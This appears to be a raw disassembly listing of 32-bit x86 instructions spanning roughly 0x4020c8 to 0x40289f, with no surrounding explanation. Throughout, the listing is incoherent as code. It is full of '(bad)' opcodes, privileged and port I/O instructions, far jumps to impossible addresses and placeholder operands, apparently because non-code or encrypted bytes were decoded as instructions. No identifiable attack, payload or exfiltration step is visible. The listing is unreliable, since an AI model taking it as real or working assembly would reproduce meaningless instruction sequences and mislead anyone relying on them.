  4020c8:	jae    0x4020ce
  4020ca:	jnp    0x402109
  4020cc:	imul   ebp,ebp,0x136dd32c
  4020d2:	dec    ebx
  4020d3:	sub    al,bl
  4020d5:	cld    
  4020d6:	rol    DWORD PTR [esi+0x45a821bf],0xcc
  4020dd:	inc    esp
  4020de:	cdq    
  4020df:	cmp    eax,0x2a8f8d25
  4020e4:	adc    al,0x77
  4020e6:	jae    0x4020a4
  4020e8:	iret   
  4020e9:	sar    BYTE PTR [ebx+0x1],cl
  4020ec:	pop    esi
  4020ed:	popa   
  4020ee:	fsub   DWORD PTR [esi]
  4020f0:	imul   esp,ebx,0x51
  4020f3:	push   edx
  4020f4:	adc    ch,bl
  4020f6:	dec    edi
  4020f7:	mov    al,0x79
  4020f9:	mov    edx,0x5c0b97b
  4020fe:	sub    ebx,DWORD PTR [ebp+ecx*4-0x49]
  402102:	rcl    DWORD PTR [edi-0x23937725],1
  402108:	jecxz  0x4020a2
  40210a:	fadd   QWORD PTR [esi+edx*1-0x69]
  40210e:	or     ebx,edx
  402110:	pop    ss
  402111:	xor    edx,DWORD PTR [bx]
  402114:	out    0x22,al
  402116:	in     eax,dx
  402117:	xor    BYTE PTR [esi-0x67],0xe6
  40211b:	fdivr  st,st(1)
  40211d:	enter  0x8624,0x15
  402121:	lods   eax,DWORD PTR ds:[esi]
  402122:	outs   dx,DWORD PTR es:[esi]
  402124:	mul    DWORD PTR [edi-0x712b0133]
  40212a:	fsub   DWORD PTR [esi+0x11bf8116]
  402130:	sub    eax,0x922c9c34
  402135:	mov    DWORD PTR [ebp-0x51],esp
  402138:	cld    
  402139:	jle    0x402148
  40213b:	fist   WORD PTR ds:0xe26a35b8
  402141:	ror    DWORD PTR ss:[ecx+edi*8+0x22ad7855],1
  402149:	push   ecx
  40214a:	jge    0x4020e0
  40214c:	lods   al,BYTE PTR ds:[si]
  40214e:	mov    esi,0xecc58657
  402153:	rol    ebp,0x96
  402156:	ret    0x1e8d
  402159:	lgs    edi,FWORD PTR [edx+0x5472d47c]
  402160:	xchg   ecx,eax
  402161:	push   edi
  402162:	add    al,0x6a
  402164:	dec    edi
  402165:	jns    0x4020fe
  402167:	repnz cdq 
  402169:	push   ss
  40216a:	sti    
  40216b:	scas   al,BYTE PTR es:[edi]
  40216c:	mov    ah,0xb4
  40216e:	stos   BYTE PTR es:[edi],al
  40216f:	bound  edx,QWORD PTR [esp+esi*2-0x48]
  402173:	push   edx
  402174:	rol    edx,1
  402176:	pop    esi
  402177:	and    eax,0xb670b28b
  40217c:	ds adc al,0x85
  40217f:	cdq    
  402180:	lahf   
  402181:	mov    esi,0x762eec0c
  402186:	dec    esp
  402187:	add    BYTE PTR [ebp+0x28e487d],al
  40218d:	test   edx,0xe5a13380
  402193:	xor    ebp,DWORD PTR [eax-0x79]
  402196:	jae    0x4021d3
  402198:	push   ebp
  402199:	imul   DWORD PTR [ecx]
  40219b:	in     eax,dx
  40219c:	mov    dh,0xb
  40219e:	arpl   WORD PTR [edi],bx
  4021a0:	mov    ds:0x29d0d712,eax
  4021a5:	mov    cl,0x55
  4021a7:	jo     0x4021e9
  4021a9:	jo     0x402204
  4021ab:	inc    esi
  4021ac:	cli    
  4021ad:	pushf  
  4021ae:	push   0x6f
  4021b0:	and    eax,0xca655358
  4021b5:	push   eax
  4021b6:	popa   
  4021b7:	and    BYTE PTR [esi+0x1d],ch
  4021ba:	hlt    
  4021bb:	cmp    BYTE PTR [esp+ecx*1-0x4aa89dd0],bl
  4021c2:	(bad)  [eax]
  4021c4:	iret   
  4021c5:	leave  
  4021c6:	shl    DWORD PTR [ebx],1
  4021c8:	mov    ecx,DWORD PTR [edx+edx*4]
  4021cb:	ja     0x4021d4
  4021cd:	sbb    eax,DWORD PTR [esi+esi*2+0x25]
  4021d1:	loopne 0x40219f
  4021d3:	mov    eax,ds:0x6c751c6a
  4021d8:	sub    ebp,DWORD PTR [eax]
  4021da:	mov    bh,0x60
  4021dc:	imul   edi,DWORD PTR [edi],0xa052b3e6
  4021e2:	jle    0x4021f6
  4021e4:	outs   dx,DWORD PTR ds:[esi]
  4021e5:	push   ebp
  4021e6:	adc    DWORD PTR [edx-0x61],ebx
  4021e9:	inc    ecx
  4021ea:	in     eax,dx
  4021eb:	lods   eax,DWORD PTR ds:[esi]
  4021ec:	cli    
  4021ed:	(bad)  
  4021ee:	sub    BYTE PTR [ebp-0x2ea438d8],ch
  4021f4:	(bad)  [esi+0x78]
  4021f7:	call   0xc79d:0x2e6978d8
  4021fe:	outs   dx,BYTE PTR ds:[esi]
  4021ff:	jae    0x402213
  402201:	and    eax,0xaac6ef0d
  402206:	mov    BYTE PTR [eax+0x18],dl
  402209:	jle    0x40226c
  40220b:	stc    
  40220c:	xchg   edi,eax
  40220d:	dec    esi
  40220e:	iret   
  40220f:	mov    edx,0x8272b0df
  402214:	mov    ch,BYTE PTR ds:0x31c39fa8
  40221a:	iret   
  40221b:	xchg   BYTE PTR [ebx+0x5d5baca],cl
  402221:	outs   dx,DWORD PTR ds:[esi]
  402222:	or     BYTE PTR [ebx],bl
  402224:	es and DWORD PTR ds:[ebp-0x4ac4ef3c],edx
  40222c:	mov    ecx,0x41e96b3d
  402231:	pop    esp
  402232:	mov    al,ds:0x868586a
  402237:	sub    BYTE PTR [ecx-0x50],bh
  40223a:	adc    ebx,DWORD PTR [edi+0x2c]
  40223d:	cdq    
  40223e:	fwait
  40223f:	sub    DWORD PTR [edx],esi
  402241:	xchg   ebx,eax
  402242:	rcl    BYTE PTR [edi-0x24303300],0xfc
  402249:	sbb    ah,bl
  40224b:	rcr    BYTE PTR [edi+0x70],1
  40224e:	sbb    DWORD PTR [edx],ebp
  402250:	loop   0x40226b
  402252:	sub    edi,edi
  402254:	(bad)  
  402255:	mov    al,ds:0xcdf32b29
  40225a:	xor    BYTE PTR [eax+ecx*1],0xef
  40225e:	iret   
  40225f:	imul   edi,ebx,0x15
  402262:	mov    al,ds:0xfa71ef17
  402267:	jp     0x4022ce
  402269:	pop    ss
  40226a:	imul   ecx,DWORD PTR [ecx-0x46],0xffffffb4
  40226e:	mov    dl,0xbf
  402270:	shl    DWORD PTR [esi],cl
  402272:	jmp    0x602e36de
  402277:	fs test al,0xb8
  40227a:	pop    esi
  40227b:	jmp    0xfc42:0x3378a3e5
  402282:	rol    DWORD PTR [edx],1
  402284:	(bad)  
  402285:	or     DWORD PTR [edx],edx
  402287:	jne    0x402263
  402289:	mov    eax,ds:0x6da9a40f
  40228e:	test   BYTE PTR [esi],cl
  402290:	sahf   
  402291:	aaa    
  402292:	mov    esi,0xdca8721e
  402297:	enter  0x9d01,0x9e
  40229b:	xor    BYTE PTR [esi+ecx*2+0x58bc9518],cl
  4022a2:	xchg   edi,eax
  4022a3:	(bad)  ds:0xf97f32d6
  4022a9:	and    al,BYTE PTR [eax-0x4f638056]
  4022af:	test   DWORD PTR [ecx+0x4e8ea13],esp
  4022b5:	mov    ebp,0x502352d2
  4022ba:	add    dl,dl
  4022bc:	imul   ebx,DWORD PTR [edi-0x4b778221],0xffffff9b
  4022c3:	pop    ecx
  4022c4:	sbb    eax,0xe27046d1
  4022c9:	inc    ecx
  4022ca:	push   ss
  4022cb:	pop    es
  4022cc:	pop    eax
  4022cd:	out    0xfd,eax
  4022cf:	inc    ebp
  4022d0:	outs   dx,BYTE PTR ds:[esi]
  4022d1:	sub    bl,BYTE PTR [eax+0x5b]
  4022d4:	mov    dl,0x1e
  4022d6:	in     al,dx
  4022d7:	aas    
  4022d8:	std    
  4022d9:	or     al,0xf6
  4022db:	arpl   WORD PTR [edx+ebp*4+0x2e502ea5],ax
  4022e2:	data16 mov WORD PTR [ebx+0x621ad15e],cs
  4022e9:	sub    al,BYTE PTR [edi+0x424cb57c]
  4022ef:	stc    
  4022f0:	pop    edi
  4022f1:	pop    eax
  4022f2:	ss pop edi
  4022f4:	outs   dx,BYTE PTR ds:[esi]
  4022f5:	outs   dx,DWORD PTR ds:[esi]
  4022f6:	inc    esi
  4022f7:	sbb    DWORD PTR [edi+0x57a5df75],eax
  4022fd:	and    ch,BYTE PTR [edx]
  4022ff:	out    dx,eax
  402300:	xchg   DWORD PTR [edx],ebp
  402302:	js     0x4022bd
  402304:	das    
  402305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402306:	push   edx
  402307:	dec    edx
  402308:	xchg   ebp,eax
  402309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40230a:	cwde   
  40230b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40230c:	mov    bl,0xa8
  40230e:	ja     0x4022cb
  402310:	jmp    0xfd000247
  402315:	cwde   
  402316:	xor    ebx,edx
  402318:	fdivr  st(3),st
  40231a:	fs lock cld 
  40231d:	sar    DWORD PTR [ebp-0x51f92c8a],0x5b
  402324:	aas    
  402325:	shl    DWORD PTR [edi-0x73],1
  402328:	lds    esi,FWORD PTR [edx-0x1]
  40232b:	jp     0x40234b
  40232d:	arpl   WORD PTR [ebp+0x497f919c],cx
  402333:	jmp    0x5b18ba62
  402338:	ret    
  402339:	pop    ebp
  40233a:	dec    esp
  40233b:	jnp    0x402368
  40233d:	(bad)  
  40233e:	repz jnp 0x40235e
  402341:	repz push ebx
  402343:	push   ss
  402344:	ins    BYTE PTR es:[edi],dx
  402345:	push   esi
  402346:	push   esp
  402347:	xor    ch,cl
  402349:	ins    DWORD PTR es:[edi],dx
  40234a:	inc    ecx
  40234b:	fstp   QWORD PTR [edx-0x40]
  40234e:	jnp    0x402395
  402350:	mov    dh,0xa4
  402352:	cmc    
  402353:	and    BYTE PTR ds:0x66ff4c23,dh
  402359:	pop    edi
  40235a:	hlt    
  40235b:	adc    eax,DWORD PTR [esi]
  40235d:	jmp    0xc2b9:0x99c02e0c
  402364:	jl     0x40231b
  402366:	push   esp
  402367:	das    
  402368:	mov    edi,DWORD PTR [ecx-0x47]
  40236b:	xchg   BYTE PTR [edi+0x37],ch
  40236e:	imul   DWORD PTR [ebx+0x60897db9]
  402374:	arpl   WORD PTR [ebx+eiz*4],cx
  402377:	loop   0x402373
  402379:	stos   BYTE PTR es:[edi],al
  40237a:	inc    ebp
  40237b:	leave  
  40237c:	add    al,BYTE PTR [ecx]
  40237e:	(bad)  
  40237f:	jmp    0x40233a
  402381:	dec    ebp
  402382:	adc    DWORD PTR [ebp+eiz*2+0x46],edx
  402386:	or     BYTE PTR [edx-0x7d133c34],dl
  40238c:	mov    esi,0x96b8f61b
  402391:	and    BYTE PTR [ebx+0x2eeec0b5],bh
  402397:	jmp    0x5ddd:0x1acb84e7
  40239e:	mov    bh,0x51
  4023a0:	and    BYTE PTR [ecx],ah
  4023a2:	jb     0x4023f8
  4023a4:	fisubr DWORD PTR [ecx-0x4220dbba]
  4023aa:	test   DWORD PTR [ebp+0x6e],edx
  4023ad:	push   cs
  4023ae:	(bad)  
  4023af:	pop    esp
  4023b0:	adc    DWORD PTR [esi+0x48],edi
  4023b3:	imul   ebx,DWORD PTR [edi],0x503d8084
  4023b9:	jmp    0xaed1495f
  4023be:	fistp  WORD PTR [ebx+0xd80fd84]
  4023c4:	test   BYTE PTR [esi-0x52],0xc1
  4023c8:	dec    esi
  4023c9:	sahf   
  4023ca:	aad    0x3a
  4023cc:	out    0x6,eax
  4023ce:	pop    es
  4023cf:	cmp    ah,ah
  4023d1:	scas   al,BYTE PTR es:[edi]
  4023d2:	(bad)  
  4023d3:	cld    
  4023d4:	cmp    BYTE PTR [ebx],ah
  4023d6:	inc    BYTE PTR cs:[ecx]
  4023d9:	fwait
  4023da:	pop    ebx
  4023db:	mov    bh,0x6c
  4023dd:	icebp  
  4023de:	inc    edx
  4023df:	ret    
  4023e0:	bound  eax,QWORD PTR [esi-0x38424152]
  4023e6:	(bad)  
  4023e7:	dec    esp
  4023e8:	enter  0x6e46,0x2c
  4023ec:	pop    edx
  4023ed:	dec    ecx
  4023ee:	cld    
  4023ef:	aam    0x83
  4023f1:	pusha  
  4023f2:	cmp    DWORD PTR [edx+0x3b],esi
  4023f5:	loopne 0x4023bd
  4023f7:	clc    
  4023f8:	out    0x70,al
  4023fa:	rcr    cl,0x52
  4023fd:	je     0x402381
  4023ff:	shl    edi,cl
  402401:	je     0x4023ab
  402403:	push   ebx
  402404:	int    0x88
  402406:	mov    dl,0xcb
  402408:	cmp    eax,0x96cf1441
  40240d:	retf   0x43
  402410:	mov    ds:0xbf66e6dc,al
  402415:	fmul   DWORD PTR [ebx-0x4f]
  402418:	xchg   ebx,eax
  402419:	add    DWORD PTR [ebp+0x21],0x76cbe573
  402420:	adc    DWORD PTR [edx+0x53],esi
  402423:	imul   DWORD PTR [ebx+0x6da81e96]
  402429:	cmp    eax,0x61bd471a
  40242e:	dec    esp
  40242f:	xlat   BYTE PTR ds:[ebx]
  402430:	push   ss
  402431:	pop    esi
  402432:	inc    ebp
  402433:	adc    ch,BYTE PTR [esi]
  402435:	and    DWORD PTR [edi],edx
  402437:	sub    eax,DWORD PTR [edx+ebx*4+0x3b7e6741]
  40243e:	rcr    DWORD PTR [edx],1
  402440:	clc    
  402441:	xlat   BYTE PTR ds:[ebx]
  402442:	mov    esi,esi
  402444:	test   eax,0x93a0df13
  402449:	(bad)  
  40244a:	and    eax,0x7c37c324
  40244f:	std    
  402450:	jmp    0xad7dc8f1
  402455:	shl    BYTE PTR [ecx-0x733b8da1],1
  40245b:	jg     0x402430
  40245d:	scas   al,BYTE PTR es:[edi]
  40245e:	sahf   
  40245f:	jg     0x402483
  402461:	inc    ebx
  402462:	push   ebx
  402463:	mov    al,ds:0xced76c5
  402468:	jle    0x402415
  40246a:	and    cl,ah
  40246c:	fwait
  40246d:	cmp    DWORD PTR [ebp+0x30],0x1bae6aae
  402474:	(bad)  
  402475:	retf   
  402476:	jo     0x40243e
  402478:	in     ax,0xb7
  40247b:	pop    edx
  40247c:	daa    
  40247d:	lods   al,BYTE PTR ds:[esi]
  40247e:	mov    ch,0xca
  402480:	popf   
  402481:	std    
  402482:	ret    0xb78b
  402485:	aas    
  402486:	xor    al,0xaf
  402488:	dec    ebx
  402489:	ds out 0x4f,eax
  40248c:	inc    esp
  40248d:	xor    BYTE PTR [ebx+esi*1+0x1696c228],bl
  402494:	je     0x402445
  402496:	je     0x40246a
  402498:	test   DWORD PTR [ecx],edx
  40249a:	sahf   
  40249b:	sub    DWORD PTR [esi],ebx
  40249d:	loope  0x40248b
  40249f:	cmp    edx,edx
  4024a1:	pop    ebp
  4024a2:	dec    edx
  4024a3:	mov    ds:0xe1fe55c1,eax
  4024a8:	or     bh,BYTE PTR [ebp-0x45]
  4024ab:	add    BYTE PTR [ebx-0x1d021053],cl
  4024b1:	adc    eax,0x63dd4444
  4024b6:	stos   DWORD PTR es:[edi],eax
  4024b7:	aam    0xc7
  4024b9:	loopne 0x40248d
  4024bb:	mov    edx,0x2081b6dc
  4024c0:	jg     0x4024c7
  4024c2:	sub    ah,dl
  4024c4:	call   DWORD PTR [eax+eax*8+0x1b]
  4024c8:	cld    
  4024c9:	and    eax,DWORD PTR [eax+0x7f557a5f]
  4024cf:	ficomp WORD PTR [edx-0x7]
  4024d2:	int3   
  4024d3:	mov    dl,BYTE PTR ds:[esi-0xd]
  4024d7:	(bad)  
  4024d9:	mov    ah,0x8a
  4024db:	arpl   cx,sp
  4024dd:	xlat   BYTE PTR ds:[ebx]
  4024de:	cmp    ch,BYTE PTR [esi+ebp*4+0x6a]
  4024e2:	ins    BYTE PTR es:[edi],dx
  4024e3:	shr    DWORD PTR [eax+0xfe441d1],0x7b
  4024ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024eb:	test   ch,ah
  4024ed:	mov    al,ds:0xf8ea399e
  4024f2:	mov    ebx,0xbae5e0a3
  4024f7:	inc    edx
  4024f8:	cs (bad) 
  4024fb:	test   al,0x16
  4024fd:	out    dx,al
  4024fe:	push   esi
  4024ff:	fwait
  402500:	inc    esp
  402501:	ficomp DWORD PTR [ebx+0x5c]
  402504:	xchg   esi,eax
  402505:	and    eax,0xb33c5ce2
  40250a:	push   es
  40250b:	dec    esi
  40250c:	jo     0x40249c
  40250e:	push   0xffffffd2
  402510:	test   ebp,ecx
  402512:	xchg   edx,eax
  402513:	mov    cl,0x8c
  402515:	add    ch,0x11
  402518:	or     DWORD PTR [ebp-0x6c449d64],edi
  40251e:	push   ebx
  40251f:	add    DWORD PTR [ecx-0x72416235],esp
  402525:	adc    ecx,DWORD PTR [ecx]
  402527:	jp     0x40257b
  402529:	mov    edi,DWORD PTR [edx+0x7f60978d]
  40252f:	pop    edi
  402530:	adc    BYTE PTR ds:0x1f1a587,bl
  402536:	mov    BYTE PTR [eax-0x4697851e],al
  40253c:	inc    ebx
  40253d:	xchg   DWORD PTR [edi],ecx
  40253f:	push   ecx
  402540:	jp     0x402507
  402542:	push   cs
  402543:	in     al,0x90
  402545:	(bad)  
  402546:	outs   dx,BYTE PTR ds:[esi]
  402547:	sub    eax,0x9800c508
  40254c:	jle    0x4024f4
  40254e:	pop    ds
  40254f:	jne    0x402572
  402551:	enter  0xef37,0xd3
  402555:	dec    esi
  402556:	pop    ds
  402557:	mov    eax,ds:0xc3d4b563
  40255c:	sbb    DWORD PTR [esi-0x5d09bc27],0xffffff84
  402563:	mov    bl,0x5e
  402565:	xchg   ebp,eax
  402566:	arpl   WORD PTR [ebx],sp
  402568:	es sub eax,0x83ce3d44
  40256e:	inc    edi
  40256f:	mov    al,0x8f
  402571:	in     al,0xa
  402573:	inc    edi
  402574:	jle    0xb68b10b1
  40257a:	push   0xffffffd2
  40257c:	mov    cs:0x86dd528f,ax
  402583:	mov    dh,0x9c
  402585:	ret    
  402586:	leave  
  402587:	cmp    dh,cl
  402589:	scas   ax,WORD PTR es:[edi]
  40258b:	cmp    BYTE PTR [edi-0x7a],0x5d
  40258f:	pusha  
  402590:	mov    al,0xd7
  402592:	xchg   edi,eax
  402593:	sti    
  402594:	ins    BYTE PTR es:[edi],dx
  402595:	in     eax,dx
  402596:	adc    al,0xd
  402598:	cli    
  402599:	cmp    eax,0x2409605d
  40259e:	pushf  
  40259f:	xor    al,0xb0
  4025a1:	lock (bad) 
  4025a3:	sbb    esp,DWORD PTR [edx-0x7bd2432c]
  4025a9:	jbe    0x4025fd
  4025ab:	rol    BYTE PTR ds:0xd72de546,0xc5
  4025b2:	ins    DWORD PTR es:[edi],dx
  4025b3:	mov    edi,0x424e1a50
  4025b8:	add    eax,0xc82cca28
  4025bd:	pop    ebx
  4025be:	fwait
  4025bf:	cli    
  4025c0:	mov    BYTE PTR [esi+0x7f],cl
  4025c3:	mov    al,ds:0x4925fbac
  4025c8:	and    BYTE PTR [edi-0x49aa3b89],dh
  4025ce:	push   ebx
  4025cf:	pushf  
  4025d0:	cmp    al,0x48
  4025d2:	xchg   BYTE PTR [ecx-0xd],ch
  4025d5:	cmp    eax,0x4f76c262
  4025da:	pop    ecx
  4025db:	div    DWORD PTR [ebp+esi*4-0x6b]
  4025df:	jo     0x4025b0
  4025e1:	mov    BYTE PTR [ecx+esi*1],cl
  4025e4:	lock cmp esi,ebp
  4025e7:	add    edi,DWORD PTR ds:0x84e837de
  4025ed:	pop    es
  4025ee:	ins    BYTE PTR es:[edi],dx
  4025ef:	and    al,0x6b
  4025f1:	mov    dh,0x7
  4025f3:	xchg   esi,eax
  4025f4:	(bad)  
  4025f5:	mov    bh,0x34
  4025f7:	ret    0xb6a8
  4025fa:	inc    ecx
  4025fb:	pop    ebx
  4025fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025fd:	sbb    ecx,DWORD PTR [esi+0x2e48fec3]
  402603:	loop   0x402608
  402605:	shl    BYTE PTR [ecx+0x64],0x6a
  402609:	les    ecx,FWORD PTR [eax-0x4bd9f34a]
  40260f:	inc    ebx
  402610:	inc    ecx
  402611:	popa   
  402612:	lds    edi,FWORD PTR [ecx]
  402614:	mov    ds:0x9a224ef5,al
  402619:	js     0x402635
  40261b:	cmp    bh,dl
  40261d:	inc    ebp
  40261e:	xor    al,0x1d
  402620:	iret   
  402621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402622:	inc    eax
  402623:	retf   0x8c85
  402626:	retf   0x536e
  402629:	test   al,0xbb
  40262b:	sbb    edx,DWORD PTR [edx-0xf]
  40262e:	cdq    
  40262f:	dec    esi
  402630:	icebp  
  402631:	ins    DWORD PTR es:[edi],dx
  402632:	daa    
  402633:	fstp   QWORD PTR es:[ebx]
  402636:	(bad)  
  402637:	or     esp,0xfffffff3
  40263a:	inc    eax
  40263b:	aam    0x1a
  40263d:	je     0x40262f
  40263f:	scas   eax,DWORD PTR es:[edi]
  402640:	mov    WORD PTR [eax],cs
  402642:	je     0x4025f3
  402644:	jmp    0xc69:0x29707877
  40264b:	clc    
  40264c:	jle    0x4025d0
  40264e:	fdiv   st(0),st
  402650:	mov    BYTE PTR [esi+eiz*4+0x7a],al
  402654:	mov    ?,WORD PTR [edi+0x6f5b170]
  40265a:	fcomp  QWORD PTR [ebx]
  40265c:	xchg   ebp,eax
  40265d:	in     al,0x21
  40265f:	clc    
  402660:	mov    eax,ds:0xbdb032ed
  402665:	dec    edi
  402666:	fucomp st(0)
  402668:	jle    0x4026e0
  40266a:	mul    dl
  40266c:	stos   DWORD PTR es:[edi],eax
  40266d:	shl    DWORD PTR [edx],cl
  40266f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402670:	mov    al,0xdf
  402672:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  402674:	jbe    0x4026e0
  402676:	call   0xeaf2:0x54fcf317
  40267d:	fs scas eax,DWORD PTR es:[edi]
  40267f:	mov    dl,cl
  402681:	add    BYTE PTR [edx],bl
  402683:	ficomp DWORD PTR [eax+0x754269ce]
  402689:	ja     0x4026da
  40268b:	cld    
  40268c:	iret   
  40268d:	aas    
  40268e:	sbb    esi,DWORD PTR [ebp-0x1c]
  402691:	(bad)  
  402693:	or     DWORD PTR [ebx-0x3a],ebp
  402696:	or     al,0xdb
  402698:	repnz imul ebx,DWORD PTR [esi-0x39],0x37
  40269d:	xchg   esp,eax
  40269e:	xor    dh,cl
  4026a0:	pusha  
  4026a1:	jmp    0x4026f8
  4026a3:	xchg   esi,eax
  4026a4:	mov    al,ds:0xd86e5f6c
  4026a9:	arpl   WORD PTR [ebp+0x55d862f5],si
  4026af:	cmp    ah,ch
  4026b1:	and    dl,BYTE PTR [esi-0x31]
  4026b4:	(bad)  
  4026b5:	call   0x529c:0xd9fd54f4
  4026bc:	cwde   
  4026bd:	inc    edi
  4026be:	je     0x402658
  4026c0:	je     0x4026d7
  4026c2:	and    bl,BYTE PTR [eax+0x0]
  4026c5:	and    ah,BYTE PTR [edi]
  4026c7:	jbe    0x4026a0
  4026c9:	sbb    bl,BYTE PTR [edx-0x4e44568a]
  4026cf:	xchg   ebx,eax
  4026d0:	mov    WORD PTR [eax],ss
  4026d2:	sbb    al,0x55
  4026d4:	les    edx,FWORD PTR [edi-0x6e]
  4026d7:	jae    0x4026a7
  4026d9:	fiadd  WORD PTR [ebx]
  4026db:	sub    BYTE PTR [esi-0x5a5d437],dl
  4026e1:	sbb    bl,0x5d
  4026e4:	add    ecx,DWORD PTR [edx-0x78]
  4026e7:	shl    BYTE PTR [ebx-0x43922bf9],cl
  4026ed:	outs   dx,DWORD PTR ds:[esi]
  4026ee:	leave  
  4026ef:	xchg   ecx,eax
  4026f0:	loopne 0x402711
  4026f2:	out    dx,al
  4026f3:	sahf   
  4026f4:	imul   esp,esi,0x50
  4026f7:	xor    eax,0xce163d24
  4026fc:	push   cs
  4026fd:	pop    ebx
  4026fe:	jmp    0x46e3:0xbbaa9cd7
  402705:	sub    al,0xd1
  402707:	or     DWORD PTR [edx+0x3974484e],esi
  40270d:	retf   
  40270e:	sub    eax,0xa3ae969a
  402713:	mov    dl,0xab
  402715:	icebp  
  402716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402717:	dec    eax
  402718:	adc    BYTE PTR [eax+ebp*8-0x14],bl
  40271c:	mov    edi,0xaadb9db4
  402721:	xor    DWORD PTR [edx+ebx*4],0x4c
  402725:	lds    edi,FWORD PTR [eax-0x53a6e436]
  40272b:	fwait
  40272c:	rcr    BYTE PTR ds:0x69d8892d,0xd8
  402733:	add    ebx,ecx
  402735:	rol    esp,1
  402737:	mov    ecx,0x625a7cf7
  40273c:	jl     0x402751
  40273e:	mov    eax,0xb4561806
  402743:	adc    al,BYTE PTR [ebx+0x6eb9d2d4]
  402749:	push   esp
  40274a:	pop    eax
  40274b:	mov    ecx,0x579a3a52
  402750:	clc    
  402751:	sbb    eax,0x2e9bdf3e
  402756:	jae    0x4027b5
  402758:	adc    ebx,eax
  40275a:	xlat   BYTE PTR ds:[ebx]
  40275b:	jns    0x4027cf
  40275d:	sar    DWORD PTR [ecx],0x9f
  402760:	jmp    0x40271f
  402762:	sbb    eax,0x77b43e25
  402767:	push   0xffffffa4
  402769:	cmp    bl,ah
  40276b:	xor    eax,0x698fae77
  402770:	lds    esi,FWORD PTR ds:0xefca082
  402776:	mov    esp,0x361481a6
  40277b:	mov    edi,0x410a38b
  402780:	push   esi
  402781:	rcl    DWORD PTR [edi],0x8d
  402784:	mov    ?,WORD PTR [ebx+0x69]
  402787:	mov    esi,0x24b83874
  40278c:	into   
  40278d:	cmp    cl,BYTE PTR [esi+0x1fa5504e]
  402793:	sub    dh,ch
  402795:	mov    ch,0x5a
  402797:	jge    0x4027bd
  402799:	jmp    0x402790
  40279b:	sub    BYTE PTR [ecx+0x7b],cl
  40279e:	dec    ebp
  40279f:	data16 cli 
  4027a1:	lods   al,BYTE PTR ds:[esi]
  4027a2:	sbb    dl,BYTE PTR [edi]
  4027a4:	xchg   DWORD PTR [ebx],ecx
  4027a6:	loopne 0x40280c
  4027a8:	mov    edx,0x2c409583
  4027ad:	dec    edi
  4027ae:	aas    
  4027af:	sub    bh,BYTE PTR [edi+0x28]
  4027b2:	sbb    al,0xe2
  4027b4:	pop    ebx
  4027b5:	enter  0xf0a5,0xc1
  4027b9:	mov    ecx,0x5594d04f
  4027be:	loopne 0x402797
  4027c0:	push   eax
  4027c1:	fsub   DWORD PTR [eax]
  4027c3:	and    DWORD PTR [eax+0x7f],ebx
  4027c6:	mov    eax,ds:0x79e4ff1f
  4027cb:	(bad)  
  4027cc:	ror    BYTE PTR [ecx-0x76],cl
  4027cf:	cs push 0x1359374d
  4027d5:	sar    BYTE PTR [eax+0x866e23f],1
  4027db:	fnstsw WORD PTR gs:0xa5b3d6b8
  4027e2:	inc    ebp
  4027e3:	mov    ecx,0xa2da2032
  4027e8:	js     0x40281e
  4027ea:	frstor [edx-0x788b4153]
  4027f0:	icebp  
  4027f1:	mov    eax,DWORD PTR [ebp-0x30]
  4027f4:	ins    BYTE PTR es:[edi],dx
  4027f5:	mov    edx,0xbbf77ba0
  4027fa:	or     BYTE PTR [ebp-0x25],bl
  4027fd:	test   DWORD PTR [esi],ebx
  4027ff:	bound  esi,QWORD PTR [ecx+0x6fa7cd48]
  402805:	cmp    ecx,esp
  402807:	ret    
  402808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402809:	pop    ebp
  40280a:	pop    es
  40280b:	les    eax,FWORD PTR [edi+0x65]
  40280e:	sbb    DWORD PTR [ebp-0x19],eax
  402811:	push   edx
  402812:	(bad)  
  402813:	lahf   
  402814:	add    ebp,edx
  402816:	(bad)  
  402817:	out    0x48,al
  402819:	cli    
  40281a:	aam    0x69
  40281c:	sbb    ebp,DWORD PTR [eax-0x63]
  40281f:	daa    
  402820:	lods   al,BYTE PTR ds:[esi]
  402821:	ds xchg ecx,eax
  402823:	dec    ebx
  402824:	retf   
  402825:	push   edi
  402826:	leave  
  402827:	push   ds
  402828:	jbe    0x4027ad
  40282a:	inc    esp
  40282b:	dec    edx
  40282c:	or     eax,0xbb4d5645
  402831:	in     eax,0xd3
  402833:	mov    ch,0x9
  402835:	xchg   ebp,esp
  402837:	cmc    
  402838:	xor    al,0xa9
  40283a:	std    
  40283b:	into   
  40283c:	mov    ds:0x6d1bd209,al
  402841:	mov    al,ds:0xdeda3d53
  402846:	xlat   BYTE PTR ds:[ebx]
  402847:	adc    BYTE PTR [ecx],bh
  402849:	aas    
  40284a:	adc    eax,0x6d40df87
  40284f:	jo     0x40284d
  402851:	adc    BYTE PTR [eax-0x12],cl
  402854:	push   edi
  402855:	lds    esp,FWORD PTR [edx-0x6b]
  402858:	ins    DWORD PTR es:[edi],dx
  402859:	cmp    bl,al
  40285b:	jmp    0x4028c7
  40285d:	nop
  40285e:	add    eax,DWORD PTR ds:0xd601e321
  402864:	xchg   ebx,eax
  402865:	jp     0x402897
  402867:	xchg   BYTE PTR [ebx],cl
  402869:	in     al,0xfe
  40286b:	js     0x4028ec
  40286d:	stos   DWORD PTR es:[edi],eax
  40286e:	(bad)  
  40286f:	call   DWORD PTR ds:0xacaa751a
  402875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402876:	mov    ch,0x68
  402878:	or     esi,DWORD PTR [ebx]
  40287a:	rcr    BYTE PTR [eax],0x85
  40287d:	test   DWORD PTR [eax-0x68372c2f],0x73766f2a
  402887:	dec    edi
  402888:	adc    ecx,DWORD PTR [edx]
  40288a:	sar    cl,cl
  40288c:	mov    eax,0xc9671b8c
  402891:	xor    ecx,DWORD PTR [ecx+0x6e3865a9]
  402897:	stos   BYTE PTR es:[edi],al
  402898:	retf   
  402899:	loope  0x40290f
  40289b:	lods   al,BYTE PTR ds:[esi]
  40289c:	outs   dx,DWORD PTR ds:[esi]
  40289d:	jno    0x40289e
  40289f:	pop    ds
